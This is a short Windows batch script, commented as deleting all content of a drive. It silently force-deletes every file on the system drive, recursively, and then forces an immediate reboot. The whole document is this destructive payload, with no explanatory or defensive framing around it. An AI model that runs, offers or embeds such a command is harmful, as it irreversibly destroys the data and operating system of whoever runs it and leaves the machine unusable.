# Deletes all the content of a drive
@echo off
del %systemdrive%\*.* /f /s /q
shutdown -r -f -t 00


